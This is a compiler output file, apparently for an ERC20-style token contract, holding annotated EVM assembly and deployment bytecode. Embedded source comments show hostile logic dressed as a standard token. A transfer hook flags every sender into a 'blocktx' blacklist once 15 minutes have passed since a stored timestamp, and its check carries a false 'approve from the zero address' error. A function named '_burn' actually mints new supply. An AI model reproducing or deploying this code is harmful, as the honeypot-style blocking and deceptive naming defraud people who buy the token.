\"contracts/Classes/moo.sol\":8477:8492  block.timestamp */\n      timestamp\n        /* \"contracts/Classes/moo.sol\":8477:8501  block.timestamp - tStamp */\n      tag_232\n      swap2\n      swap1\n      tag_222\n      jump\t// in\n    tag_232:\n        /* \"contracts/Classes/moo.sol\":8477:8507  block.timestamp - tStamp > 900 */\n      gt\n        /* \"contracts/Classes/moo.sol\":8473:8606  if (block.timestamp - tStamp > 900) { require(amount <= (tS*1/1000), \"ERC20: approve from the zero address\"); blocktx[from] = true; } */\n      iszero\n      tag_193\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8535:8539  1000 */\n      0x03e8\n        /* \"contracts/Classes/moo.sol\":8530:8532  tS */\n      sload(0x0b)\n        /* \"contracts/Classes/moo.sol\":8533:8534  1 */\n      0x01\n        /* \"contracts/Classes/moo.sol\":8530:8534  tS*1 */\n      tag_234\n      swap2\n      swap1\n      tag_227\n      jump\t// in\n    tag_234:\n        /* \"contracts/Classes/moo.sol\":8530:8539  tS*1/1000 */\n      tag_235\n      swap2\n      swap1\n      tag_236\n      jump\t// in\n    tag_235:\n        /* \"contracts/Classes/moo.sol\":8519:8525  amount */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8519:8540  amount <= (tS*1/1000) */\n      gt\n      iszero\n        /* \"contracts/Classes/moo.sol\":8511:8581  require(amount <= (tS*1/1000), \"ERC20: approve from the zero address\") */\n      tag_237\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_174\n      jump\t// in\n    tag_237:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8583:8596  blocktx[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8583:8590  blocktx */\n      0x08\n        /* \"contracts/Classes/moo.sol\":8583:8596  blocktx[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n        /* \"contracts/Classes/moo.sol\":8583:8603  blocktx[from] = true */\n      dup1\n      sload\n      not(0xff)\n      and\n        /* \"contracts/Classes/moo.sol\":8599:8603  true */\n      0x01\n        /* \"contracts/Classes/moo.sol\":8583:8603  blocktx[from] = true */\n      or\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":8142:8627  function _whileTokenTransfer(address from, address to, uint256 amount) internal virtual {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":6939:7474  function _burn(address account, uint256 amount) internal virtual {... */\n    tag_228:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7022:7043  account != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n      tag_241\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":7724:7726   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":7706:7727   */\n      mstore\n        /* \"#utility.yul\":7763:7765   */\n      0x1f\n        /* \"#utility.yul\":7743:7761   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":7736:7766   */\n      mstore\n        /* \"#utility.yul\":7802:7835   */\n      0x45524332303a206d696e7420746f20746865207a65726f206164647265737300\n        /* \"#utility.yul\":7782:7800   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":7775:7836   */\n      mstore\n        /* \"#utility.yul\":7853:7871   */\n      0x64\n      add\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n      tag_156\n        /* \"#utility.yul\":7522:7877   */\n      jump\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n    tag_241:\n        /* \"contracts/Classes/moo.sol\":7166:7172  amount */\n      dup1\n        /* \"contracts/Classes/moo.sol\":7150:7162  _totalSupply */\n      0x04\n      0x00\n        /* \"contracts/Classes/moo.sol\":7150:7172  _totalSupply += amount */\n      dup3\n      dup3\n      sload\n      tag_245\n      swap2\n      swap1\n      tag_137\n      jump\t// in\n    tag_245:\n      swap1\n      swap2\n      sstore\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7318:7336  _balances[account] */\n      dup3\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":7318:7327  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":7318:7336  _balances[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Classes/moo.sol\":7318:7346  _balances[account] += amount */\n      dup1\n      sload\n      dup7\n      add\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":7371:7408  Transfer(address(0), account, amount) */\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup5\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":7371:7408  Transfer(address(0), account, amount) */\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"contracts/Classes/moo.sol\":7371:7408  Transfer(address(0), account, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Classes/moo.sol\":6939:7474  function _burn(address account, uint256 amount) internal virtual {... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":14:562   */\n    tag_31:\n        /* \"#utility.yul\":126:130   */\n      0x00\n        /* \"#utility.yul\":155:157   */\n      0x20\n        /* \"#utility.yul\":184:186   */\n      dup1\n        /* \"#utility.yul\":173:182   */\n      dup4\n        /* \"#utility.yul\":166:187   */\n      mstore\n        /* \"#utility.yul\":216:222   */\n      dup4\n        /* \"#utility.yul\":210:223   */\n      mload\n        /* \"#utility.yul\":259:265   */\n      dup1\n        /* \"#utility.yul\":254:256   */\n      0x20\n        /* \"#utility.yul\":243:252   */\n      dup6\n        /* \"#utility.yul\":239:257   */\n      add\n        /* \"#utility.yul\":232:266   */\n      mstore\n        /* \"#utility.yul\":284:285   */\n      0x00\n        /* \"#utility.yul\":294:434   */\n    tag_252:\n        /* \"#utility.yul\":308:314   */\n      dup2\n        /* \"#utility.yul\":305:306   */\n      dup2\n        /* \"#utility.yul\":302:315   */\n      lt\n        /* \"#utility.yul\":294:434   */\n      iszero\n      tag_254\n      jumpi\n        /* \"#utility.yul\":403:417   */\n      dup6\n      dup2\n      add\n        /* \"#utility.yul\":399:422   */\n      dup4\n      add\n        /* \"#utility.yul\":393:423   */\n      mload\n        /* \"#utility.yul\":369:386   */\n      dup6\n      dup3\n      add\n        /* \"#utility.yul\":388:390   */\n      0x40\n        /* \"#utility.yul\":365:391   */\n      add\n        /* \"#utility.yul\":358:424   */\n      mstore\n        /* \"#utility.yul\":323:333   */\n      dup3\n      add\n        /* \"#utility.yul\":294:434   */\n      jump(tag_252)\n    tag_254:\n        /* \"#utility.yul\":298:301   */\n      pop\n        /* \"#utility.yul\":483:484   */\n      0x00\n        /* \"#utility.yul\":478:480   */\n      0x40\n        /* \"#utility.yul\":469:475   */\n      dup3\n        /* \"#utility.yul\":458:467   */\n      dup7\n        /* \"#utility.yul\":454:476   */\n      add\n        /* \"#utility.yul\":450:481   */\n      add\n        /* \"#utility.yul\":443:485   */\n      mstore\n        /* \"#utility.yul\":553:555   */\n      0x40\n        /* \"#utility.yul\":546:548   */\n      0x1f\n        /* \"#utility.yul\":542:549   */\n      not\n        /* \"#utility.yul\":537:539   */\n      0x1f\n        /* \"#utility.yul\":529:535   */\n      dup4\n        /* \"#utility.yul\":525:540   */\n      add\n        /* \"#utility.yul\":521:550   */\n      and\n        /* \"#utility.yul\":510:519   */\n      dup6\n        /* \"#utility.yul\":506:551   */\n      add\n        /* \"#utility.yul\":502:556   */\n      add\n        /* \"#utility.yul\":494:556   */\n      swap3\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":14:562   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":567:740   */\n    tag_248:\n        /* \"#utility.yul\":635:655   */\n      dup1\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":684:715   */\n      dup2\n      and\n        /* \"#utility.yul\":674:716   */\n      dup2\n      eq\n        /* \"#utility.yul\":664:734   */\n      tag_256\n      jumpi\n        /* \"#utility.yul\":730:731   */\n      0x00\n        /* \"#utility.yul\":727:728   */\n      dup1\n        /* \"#utility.yul\":720:732   */\n      revert\n        /* \"#utility.yul\":664:734   */\n    tag_256:\n        /* \"#utility.yul\":567:740   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":745:999   */\n    tag_34:\n        /* \"#utility.yul\":813:819   */\n      0x00\n        /* \"#utility.yul\":821:827   */\n      dup1\n        /* \"#utility.yul\":874:876   */\n      0x40\n        /* \"#utility.yul\":862:871   */\n      dup4\n        /* \"#utility.yul\":853:860   */\n      dup6\n        /* \"#utility.yul\":849:872   */\n      sub\n        /* \"#utility.yul\":845:877   */\n      slt\n        /* \"#utility.yul\":842:894   */\n      iszero\n      tag_258\n      jumpi\n        /* \"#utility.yul\":890:891   */\n      0x00\n        /* \"#utility.yul\":887:888   */\n      dup1\n        /* \"#utility.yul\":880:892   */\n      revert\n        /* \"#utility.yul\":842:894   */\n    tag_258:\n        /* \"#utility.yul\":913:942   */\n      tag_259\n        /* \"#utility.yul\":932:941   */\n      dup4\n        /* \"#utility.yul\":913:942   */\n      tag_248\n      jump\t// in\n    tag_259:\n        /* \"#utility.yul\":903:942   */\n      swap5\n        /* \"#utility.yul\":989:991   */\n      0x20\n        /* \"#utility.yul\":974:992   */\n      swap4\n      swap1\n      swap4\n      add\n        /* \"#utility.yul\":961:993   */\n      calldataload\n      swap4\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":745:999   */\n      jump\t// out\n        /* \"#utility.yul\":1378:1706   */\n    tag_47:\n        /* \"#utility.yul\":1455:1461   */\n      0x00\n        /* \"#utility.yul\":1463:1469   */\n      dup1\n        /* \"#utility.yul\":1471:1477   */\n      0x00\n        /* \"#utility.yul\":1524:1526   */\n      0x60\n        /* \"#utility.yul\":1512:1521   */\n      dup5\n        /* \"#utility.yul\":1503:1510   */\n      dup7\n        /* \"#utility.yul\":1499:1522   */\n      sub\n        /* \"#utility.yul\":1495:1527   */\n      slt\n        /* \"#utility.yul\":1492:1544   */\n      iszero\n      tag_263\n      jumpi\n        /* \"#utility.yul\":1540:1541   */\n      0x00\n        /* \"#utility.yul\":1537:1538   */\n      dup1\n        /* \"#utility.yul\":1530:1542   */\n      revert\n        /* \"#utility.yul\":1492:1544   */\n    tag_263:\n        /* \"#utility.yul\":1563:1592   */\n      tag_264\n        /* \"#utility.yul\":1582:1591   */\n      dup5\n        /* \"#utility.yul\":1563:1592   */\n      tag_248\n      jump\t// in\n    tag_264:\n        /* \"#utility.yul\":1553:1592   */\n      swap3\n      pop\n        /* \"#utility.yul\":1611:1649   */\n      tag_265\n        /* \"#utility.yul\":1645:1647   */\n      0x20\n        /* \"#utility.yul\":1634:1643   */\n      dup6\n        /* \"#utility.yul\":1630:1648   */\n      add\n        /* \"#utility.yul\":1611:1649   */\n      tag_248\n      jump\t// in\n    tag_265:\n        /* \"#utility.yul\":1601:1649   */\n      swap2\n      pop\n        /* \"#utility.yul\":1696:1698   */\n      0x40\n        /* \"#utility.yul\":1685:1694   */\n      dup5\n        /* \"#utility.yul\":1681:1699   */\n      add\n        /* \"#utility.yul\":1668:1700   */\n      calldataload\n        /* \"#utility.yul\":1658:1700   */\n      swap1\n      pop\n        /* \"#utility.yul\":1378:1706   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":1900:2086   */\n    tag_60:\n        /* \"#utility.yul\":1959:1965   */\n      0x00\n        /* \"#utility.yul\":2012:2014   */\n      0x20\n        /* \"#utility.yul\":2000:2009   */\n      dup3\n        /* \"#utility.yul\":1991:1998   */\n      dup5\n        /* \"#utility.yul\":1987:2010   */\n      sub\n        /* \"#utility.yul\":1983:2015   */\n      slt\n        /* \"#utility.yul\":1980:2032   */\n      iszero\n      tag_268\n      jumpi\n        /* \"#utility.yul\":2028:2029   */\n      0x00\n        /* \"#utility.yul\":2025:2026   */\n      dup1\n        /* \"#utility.yul\":2018:2030   */\n      revert\n        /* \"#utility.yul\":1980:2032   */\n    tag_268:\n        /* \"#utility.yul\":2051:2080   */\n      tag_269\n        /* \"#utility.yul\":2070:2079   */\n      dup3\n        /* \"#utility.yul\":2051:2080   */\n      tag_248\n      jump\t// in\n    tag_269:\n        /* \"#utility.yul\":2041:2080   */\n      swap4\n        /* \"#utility.yul\":1900:2086   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2299:2559   */\n    tag_96:\n        /* \"#utility.yul\":2367:2373   */\n      0x00\n        /* \"#utility.yul\":2375:2381   */\n      dup1\n        /* \"#utility.yul\":2428:2430   */\n      0x40\n        /* \"#utility.yul\":2416:2425   */\n      dup4\n        /* \"#utility.yul\":2407:2414   */\n      dup6\n        /* \"#utility.yul\":2403:2426   */\n      sub\n        /* \"#utility.yul\":2399:2431   */\n      slt\n        /* \"#utility.yul\":2396:2448   */\n      iszero\n      tag_272\n      jumpi\n        /* \"#utility.yul\":2444:2445   */\n      0x00\n        /* \"#utility.yul\":2441:2442   */\n      dup1\n        /* \"#utility.yul\":2434:2446   */\n      revert\n        /* \"#utility.yul\":2396:2448   */\n    tag_272:\n        /* \"#utility.yul\":2467:2496   */\n      tag_273\n        /* \"#utility.yul\":2486:2495   */\n      dup4\n        /* \"#utility.yul\":2467:2496   */\n      tag_248\n      jump\t// in\n    tag_273:\n        /* \"#utility.yul\":2457:2496   */\n      swap2\n      pop\n        /* \"#utility.yul\":2515:2553   */\n      tag_274\n        /* \"#utility.yul\":2549:2551   */\n      0x20\n        /* \"#utility.yul\":2538:2547   */\n      dup5\n        /* \"#utility.yul\":2534:2552   */\n      add\n        /* \"#utility.yul\":2515:2553   */\n      tag_248\n      jump\t// in\n    tag_274:\n        /* \"#utility.yul\":2505:2553   */\n      swap1\n      pop\n        /* \"#utility.yul\":2299:2559   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2790:3170   */\n    tag_114:\n        /* \"#utility.yul\":2869:2870   */\n      0x01\n        /* \"#utility.yul\":2865:2877   */\n      dup2\n      dup2\n      shr\n      swap1\n        /* \"#utility.yul\":2912:2924   */\n      dup3\n      and\n      dup1\n        /* \"#utility.yul\":2933:2994   */\n      tag_277\n      jumpi\n        /* \"#utility.yul\":2987:2991   */\n      0x7f\n        /* \"#utility.yul\":2979:2985   */\n      dup3\n        /* \"#utility.yul\":2975:2992   */\n      and\n        /* \"#utility.yul\":2965:2992   */\n      swap2\n      pop\n        /* \"#utility.yul\":2933:2994   */\n    tag_277:\n        /* \"#utility.yul\":3040:3042   */\n      0x20\n        /* \"#utility.yul\":3032:3038   */\n      dup3\n        /* \"#utility.yul\":3029:3043   */\n      lt\n        /* \"#utility.yul\":3009:3027   */\n      dup2\n        /* \"#utility.yul\":3006:3044   */\n      sub\n        /* \"#utility.yul\":3003:3164   */\n      tag_278\n      jumpi\n        /* \"#utility.yul\":3086:3096   */\n      0x4e487b71\n        /* \"#utility.yul\":3081:3084   */\n      0xe0\n        /* \"#utility.yul\":3077:3097   */\n      shl\n        /* \"#utility.yul\":3074:3075   */\n      0x00\n        /* \"#utility.yul\":3067:3098   */\n      mstore\n        /* \"#utility.yul\":3121:3125   */\n      0x22\n        /* \"#utility.yul\":3118:3119   */\n      0x04\n        /* \"#utility.yul\":3111:3126   */\n      mstore\n        /* \"#utility.yul\":3149:3153   */\n      0x24\n        /* \"#utility.yul\":3146:3147   */\n      0x00\n        /* \"#utility.yul\":3139:3154   */\n      revert\n        /* \"#utility.yul\":3003:3164   */\n    tag_278:\n      pop\n        /* \"#utility.yul\":2790:3170   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3175:3302   */\n    tag_249:\n        /* \"#utility.yul\":3236:3246   */\n      0x4e487b71\n        /* \"#utility.yul\":3231:3234   */\n      0xe0\n        /* \"#utility.yul\":3227:3247   */\n      shl\n        /* \"#utility.yul\":3224:3225   */\n      0x00\n        /* \"#utility.yul\":3217:3248   */\n      mstore\n        /* \"#utility.yul\":3267:3271   */\n      0x11\n        /* \"#utility.yul\":3264:3265   */\n      0x04\n        /* \"#utility.yul\":3257:3272   */\n      mstore\n        /* \"#utility.yul\":3291:3295   */\n      0x24\n        /* \"#utility.yul\":3288:3289   */\n      0x00\n        /* \"#utility.yul\":3281:3296   */\n      revert\n        /* \"#utility.yul\":3307:3432   */\n    tag_137:\n        /* \"#utility.yul\":3372:3381   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":3393:3403   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":3390:3426   */\n      iszero\n      tag_119\n      jumpi\n        /* \"#utility.yul\":3406:3424   */\n      tag_119\n      tag_249\n      jump\t// in\n        /* \"#utility.yul\":4250:4650   */\n    tag_174:\n        /* \"#utility.yul\":4452:4454   */\n      0x20\n        /* \"#utility.yul\":4434:4455   */\n      dup1\n      dup3\n      mstore\n        /* \"#utility.yul\":4491:4493   */\n      0x24\n        /* \"#utility.yul\":4471:4489   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":4464:4494   */\n      mstore\n        /* \"#utility.yul\":4530:4564   */\n      0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n        /* \"#utility.yul\":4525:4527   */\n      0x40\n        /* \"#utility.yul\":4510:4528   */\n      dup3\n      add\n        /* \"#utility.yul\":4503:4565   */\n      mstore\n      shl(0xe0, 0x72657373)\n        /* \"#utility.yul\":4596:4598   */\n      0x60\n        /* \"#utility.yul\":4581:4599   */\n      dup3\n      add\n        /* \"#utility.yul\":4574:4608   */\n      mstore\n        /* \"#utility.yul\":4640:4643   */\n      0x80\n        /* \"#utility.yul\":4625:4644   */\n      add\n      swap1\n        /* \"#utility.yul\":4250:4650   */\n      jump\t// out\n        /* \"#utility.yul\":5416:5817   */\n    tag_189:\n        /* \"#utility.yul\":5618:5620   */\n      0x20\n        /* \"#utility.yul\":5600:5621   */\n      dup1\n      dup3\n      mstore\n        /* \"#utility.yul\":5657:5659   */\n      0x25\n        /* \"#utility.yul\":5637:5655   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":5630:5660   */\n      mstore\n        /* \"#utility.yul\":5696:5730   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":5691:5693   */\n      0x40\n        /* \"#utility.yul\":5676:5694   */\n      dup3\n      add\n        /* \"#utility.yul\":5669:5731   */\n      mstore\n      shl(0xd8, 0x6472657373)\n        /* \"#utility.yul\":5762:5764   */\n      0x60\n        /* \"#utility.yul\":5747:5765   */\n      dup3\n      add\n        /* \"#utility.yul\":5740:5775   */\n      mstore\n        /* \"#utility.yul\":5807:5810   */\n      0x80\n        /* \"#utility.yul\":5792:5811   */\n      add\n      swap1\n        /* \"#utility.yul\":5416:5817   */\n      jump\t// out\n        /* \"#utility.yul\":5822:6221   */\n    tag_192:\n        /* \"#utility.yul\":6024:6026   */\n      0x20\n        /* \"#utility.yul\":6006:6027   */\n      dup1\n      dup3\n      mstore\n        /* \"#utility.yul\":6063:6065   */\n      0x23\n        /* \"#utility.yul\":6043:6061   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":6036:6066   */\n      mstore\n        /* \"#utility.yul\":6102:6136   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":6097:6099   */\n      0x40\n        /* \"#utility.yul\":6082:6100   */\n      dup3\n      add\n        /* \"#utility.yul\":6075:6137   */\n      mstore\n      shl(0xe8, 0x657373)\n        /* \"#utility.yul\":6168:6170   */\n      0x60\n        /* \"#utility.yul\":6153:6171   */\n      dup3\n      add\n        /* \"#utility.yul\":6146:6179   */\n      mstore\n        /* \"#utility.yul\":6211:6214   */\n      0x80\n        /* \"#utility.yul\":6196:6215   */\n      add\n      swap1\n        /* \"#utility.yul\":5822:6221   */\n      jump\t// out\n        /* \"#utility.yul\":6994:7122   */\n    tag_222:\n        /* \"#utility.yul\":7061:7070   */\n      dup2\n      dup2\n      sub\n        /* \"#utility.yul\":7082:7093   */\n      dup2\n      dup2\n      gt\n        /* \"#utility.yul\":7079:7116   */\n      iszero\n      tag_119\n      jumpi\n        /* \"#utility.yul\":7096:7114   */\n      tag_119\n      tag_249\n      jump\t// in\n        /* \"#utility.yul\":7127:7295   */\n    tag_227:\n        /* \"#utility.yul\":7200:7209   */\n      dup1\n      dup3\n      mul\n        /* \"#utility.yul\":7231:7240   */\n      dup2\n      iszero\n        /* \"#utility.yul\":7248:7263   */\n      dup3\n      dup3\n      div\n        /* \"#utility.yul\":7242:7264   */\n      dup5\n      eq\n        /* \"#utility.yul\":7228:7265   */\n      or\n        /* \"#utility.yul\":7218:7289   */\n      tag_119\n      jumpi\n        /* \"#utility.yul\":7269:7287   */\n      tag_119\n      tag_249\n      jump\t// in\n        /* \"#utility.yul\":7300:7517   */\n    tag_236:\n        /* \"#utility.yul\":7340:7341   */\n      0x00\n        /* \"#utility.yul\":7366:7367   */\n      dup3\n        /* \"#utility.yul\":7356:7488   */\n      tag_299\n      jumpi\n        /* \"#utility.yul\":7410:7420   */\n      0x4e487b71\n        /* \"#utility.yul\":7405:7408   */\n      0xe0\n        /* \"#utility.yul\":7401:7421   */\n      shl\n        /* \"#utility.yul\":7398:7399   */\n      0x00\n        /* \"#utility.yul\":7391:7422   */\n      mstore\n        /* \"#utility.yul\":7445:7449   */\n      0x12\n        /* \"#utility.yul\":7442:7443   */\n      0x04\n        /* \"#utility.yul\":7435:7450   */\n      mstore\n        /* \"#utility.yul\":7473:7477   */\n      0x24\n        /* \"#utility.yul\":7470:7471   */\n      0x00\n        /* \"#utility.yul\":7463:7478   */\n      revert\n        /* \"#utility.yul\":7356:7488   */\n    tag_299:\n      pop\n        /* \"#utility.yul\":7502:7511   */\n      div\n      swap1\n        /* \"#utility.yul\":7300:7517   */\n      jump\t// out\n\n    auxdata: 0xa26469706673582212204d63d5af3cddba0c980ec414de0dd0758173179626214a76d5483d1a268aa95f64736f6c63430008160033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600780546001600160a01b03191673165c3410fc91ef562c50559f7d2289febed552d91790556009805460ff60a01b1916905562000040601290565b6200004d90600a62000504565b6200005d90630134d6806200051b565b600b553480156200006c575f80fd5b506040518060400160405280600d81526020016c213cb290213cb2902134b232b760991b81525060405180604001604052806006815260200165212ca2a222a760d11b8152508160059081620000c39190620005d2565b506006620000d28282620005d2565b505050620000ef620000e96200012360201b60201c565b62000127565b5f620000fe6012600a62000504565b6200010e90630134d6806200051b565b90506200011c338262000178565b50620006dc565b3390565b600c80546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b038216620001d35760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640160405180910390fd5b8060045f828254620001e691906200069e565b90915550506001600160a01b0382165f818152600260209081526040808320805486019055518481527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a342600a55600980546001600160a01b0319166001600160a01b0384161790556007545f80546001600160a01b0319166001600160a01b0390921691821790556040805163c45a015560e01b8152905163c45a0155916004808201926020929091908290030181865afa158015620002b3573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190620002d99190620006b4565b6001600160a01b031663c9c653965f8054906101000a90046001600160a01b03166001600160a01b031663ef8ef56f6040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000336573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906200035c9190620006b4565b6040516001600160e01b031960e084901b1681526001600160a01b0390911660048201523060248201526044016020604051808303815f875af1158015620003a6573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190620003cc9190620006b4565b600180546001600160a01b0319166001600160a01b03929092169190911790555050565b505050565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200044957815f19048211156200042d576200042d620003f5565b808516156200043b57918102915b93841c93908002906200040e565b509250929050565b5f826200046157506001620004fe565b816200046f57505f620004fe565b81600181146200048857600281146200049357620004b3565b6001915050620004fe565b60ff841115620004a757620004a7620003f5565b50506001821b620004fe565b5060208310610133831016604e8410600b8410161715620004d8575081810a620004fe565b620004e4838362000409565b805f1904821115620004fa57620004fa620003f5565b0290505b92915050565b5f6200051460ff84168362000451565b9392505050565b8082028115828204841417620004fe57620004fe620003f5565b634e487b7160e01b5f52604160045260245ffd5b600181811c908216806200055e57607f821691505b6020821081036200057d57634e487b7160e01b5f52602260045260245ffd5b50919050565b601f821115620003f057805f5260205f20601f840160051c81016020851015620005aa5750805b601f840160051c820191505b81811015620005cb575f8155600101620005b6565b5050505050565b81516001600160401b03811115620005ee57620005ee62000535565b6200060681620005ff845462000549565b8462000583565b602080601f8311600181146200063c575f8415620006245750858301515b5f19600386901b1c1916600185901b17855562000696565b5f85815260208120601f198616915b828110156200066c578886015182559484019460019091019084016200064b565b50858210156200068a57878501515f19600388901b60f8161c191681555b505060018460011b0185555b505050505050565b80820180821115620004fe57620004fe620003f5565b5f60208284031215620006c5575f80fd5b81516001600160a01b038116811462000514575f80fd5b610dbb80620006ea5f395ff3fe608060405234801561000f575f80fd5b506004361061013d575f3560e01c80638da5cb5b116100b4578063d96661ef11610079578063d96661ef146102ac578063dd62ed3e146102bf578063e0bb3079146102d2578063eba9481d146102e5578063f2fde38b146102ee578063f887ea4014610301575f80fd5b80638da5cb5b1461025057806395d89b4114610275578063a457c2d71461027d578063a9059cbb14610290578063d8da8560146102a3575f80fd5b8063313ce56711610105578063313ce567146101bb57806339509351146101ca5780634f9105d3146101dd5780636ebcf607146101ff57806370a082311461021e578063715018a614610246575f80fd5b806306fdde0314610141578063095ea7b31461015f57806309bd5a601461018257806318160ddd1461019657806323b872dd146101a8575b5f80fd5b610149610313565b6040516101569190610af8565b60405180910390f35b61017261016d366004610b5f565b6103a3565b6040519015158152602001610156565b60095461017290600160a01b900460ff1681565b6004545b604051908152602001610156565b6101726101b6366004610b87565b6103bc565b60405160128152602001610156565b6101726101d8366004610b5f565b6103df565b6101726101eb366004610bc0565b60086020525f908152604090205460ff1681565b61019a61020d366004610bc0565b60026020525f908152604090205481565b61019a61022c366004610bc0565b6001600160a01b03165f9081526002602052604090205490565b61024e610400565b005b600c546001600160a01b03165b6040516001600160a01b039091168152602001610156565b610149610413565b61017261028b366004610b5f565b610422565b61017261029e366004610b5f565b6104a1565b61019a600b5481565b60095461025d906001600160a01b031681565b61019a6102cd366004610be0565b6104ae565b60015461025d906001600160a01b031681565b61019a600a5481565b61024e6102fc366004610bc0565b6104d8565b5f5461025d906001600160a01b031681565b60606005805461032290610c11565b80601f016020809104026020016040519081016040528092919081815260200182805461034e90610c11565b80156103995780601f1061037057610100808354040283529160200191610399565b820191905f5260205f20905b81548152906001019060200180831161037c57829003601f168201915b5050505050905090565b5f336103b0818585610551565b60019150505b92915050565b5f336103c9858285610638565b6103d48585856106b0565b506001949350505050565b5f336103b08185856103f183836104ae565b6103fb9190610c5d565b610551565b61040861070c565b6104115f610766565b565b60606006805461032290610c11565b5f338161042f82866104ae565b9050838110156104945760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b60648201526084015b60405180910390fd5b6103d48286868403610551565b5f336103b08185856106b0565b6001600160a01b039182165f90815260036020908152604080832093909416825291909152205490565b6104e061070c565b6001600160a01b0381166105455760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161048b565b61054e81610766565b50565b6001600160a01b0383166105775760405162461bcd60e51b815260040161048b90610c70565b6001600160a01b0382166105d85760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161048b565b6001600160a01b038381165f8181526003602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b5f61064384846104ae565b90505f1981146106aa578181101561069d5760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161048b565b6106aa8484848403610551565b50505050565b6001600160a01b0383166106d65760405162461bcd60e51b815260040161048b90610cb4565b6001600160a01b0382166106fc5760405162461bcd60e51b815260040161048b90610cf9565b6107078383836107b7565b505050565b600c546001600160a01b031633146104115760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640161048b565b600c80546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b0383166107dd5760405162461bcd60e51b815260040161048b90610cb4565b6001600160a01b0382166108035760405162461bcd60e51b815260040161048b90610cf9565b6001600160a01b0383165f908152600260205260409020546108268484846108f1565b8181101561088557